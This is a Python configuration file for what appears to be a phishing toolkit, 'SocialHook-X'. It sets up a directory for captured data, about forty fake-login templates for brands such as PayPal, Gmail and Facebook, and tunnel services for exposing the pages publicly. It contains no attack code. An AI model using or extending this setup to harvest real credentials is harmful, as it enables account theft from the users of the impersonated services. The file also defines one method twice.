#!/usr/bin/env python3
"""
SocialHook-X Configuration Module
Centralized configuration management
"""

import os
import secrets
from pathlib import Path

class Config:
    """Application configuration"""
    
    # Project Information
    PROJECT_NAME = "SocialHook-X"
    VERSION = "4.0"
    AUTHOR = "Security Research"
    
    # Paths
    BASE_DIR = Path(__file__).parent.parent.parent
    CORE_DIR = BASE_DIR / 'core'
    TEMPLATES_DIR = BASE_DIR / 'templates'
    SERVERS_DIR = BASE_DIR / 'servers'
    OUTPUT_DIR = BASE_DIR / 'output'
    CAPTURED_DIR = BASE_DIR / 'captured_data'
    THIRD_PARTY_DIR = BASE_DIR / 'third_party'
    
    # Ensure directories exist
    for directory in [TEMPLATES_DIR, SERVERS_DIR, OUTPUT_DIR, CAPTURED_DIR]:
        directory.mkdir(exist_ok=True)
    
    # Server Configuration
    HOST = os.getenv('SHX_HOST', '127.0.0.1')
    PORT = int(os.getenv('SHX_PORT', '8080'))
    DEBUG = os.getenv('SHX_DEBUG', 'False').lower() == 'true'
    
    # Database
    DATABASE = str(OUTPUT_DIR / 'socialhook.db')
    
    # Security
    _secret_key = os.getenv('SHX_SECRET_KEY')
    SECRET_KEY = _secret_key if _secret_key else secrets.token_hex(32)
    
    @classmethod
    def get_output_file(cls, filename: str, format_type: str = 'json') -> Path:
        """Get output file path"""
        output_file = cls.OUTPUT_DIR / f"{filename}.{format_type}"
        output_file.parent.mkdir(parents=True, exist_ok=True)
        return output_file
    
    # Logging
    LOG_LEVEL = os.getenv('SHX_LOG_LEVEL', 'INFO')
    LOG_FILE = str(OUTPUT_DIR / 'socialhook.log')
    
    # Tunneling
    TUNNEL_TIMEOUT = int(os.getenv('SHX_TUNNEL_TIMEOUT', '30'))
    DEFAULT_TUNNEL = os.getenv('SHX_DEFAULT_TUNNEL', 'localhost')
    
    # Templates
    AVAILABLE_TEMPLATES = {
        'facebook': 'Facebook',
        'instagram': 'Instagram',
        'google': 'Google',
        'linkedin': 'LinkedIn',
        'twitter': 'Twitter',
        'github': 'GitHub',
        'microsoft': 'Microsoft',
        'apple': 'Apple',
        'amazon': 'Amazon',
        'paypal': 'PayPal',
        'adobe': 'Adobe',
        'dropbox': 'Dropbox',
        'ebay': 'eBay',
        'netflix': 'Netflix',
        'spotify': 'Spotify',
        'discord': 'Discord',
        'twitch': 'Twitch',
        'reddit': 'Reddit',
        'snapchat': 'Snapchat',
        'tiktok': 'TikTok',
        'telegram': 'Telegram',
        'whatsapp': 'WhatsApp',
        'viber': 'Viber',
        'signal': 'Signal',
        'slack': 'Slack',
        'gmail': 'Gmail',
        'yahoo': 'Yahoo',
        'hotmail': 'Hotmail',
        'protonmail': 'ProtonMail',
        'wordpress': 'WordPress',
        'shopify': 'Shopify',
        'pinterest': 'Pinterest',
        'medium': 'Medium',
        'quora': 'Quora',
        'stackoverflow': 'Stack Overflow',
        'deviantart': 'DeviantArt',
        'gitlab': 'GitLab',
        'bitbucket': 'Bitbucket',
        'yandex': 'Yandex',
        'vk': 'VKontakte',
    }
    
    # Tunnel Services
    TUNNEL_SERVICES = {
        'localhost': 'Local Hosting',
        'cloudflared': 'Cloudflare Tunnel',
        'localxpose': 'LocalXpose',
        'ngrok': 'Ngrok',
        'localhostrun': 'localhost.run',
    }
    
    # API Configuration
    API_TIMEOUT = 30
    MAX_RETRIES = 3
    
    @classmethod
    def get_template_list(cls):
        """Get list of available templates"""
        templates_list = []
        for idx, (key, name) in enumerate(cls.AVAILABLE_TEMPLATES.items(), 1):
            templates_list.append((idx, key, name))
        return templates_list
    
    @classmethod
    def validate_template(cls, template):
        """Validate template exists"""
        return template in cls.AVAILABLE_TEMPLATES
    
    @classmethod
    def get_output_file(cls, name, extension='txt'):
        """Generate output file path"""
        return str(cls.OUTPUT_DIR / f"{name}.{extension}")

class DevelopmentConfig(Config):
    """Development environment configuration"""
    DEBUG = True
    LOG_LEVEL = 'DEBUG'

class ProductionConfig(Config):
    """Production environment configuration"""
    DEBUG = False
    LOG_LEVEL = 'WARNING'

# Load configuration based on environment
ENV = os.getenv('SHX_ENV', 'development').lower()
if ENV == 'production':
    config = ProductionConfig()
else:
    config = DevelopmentConfig()
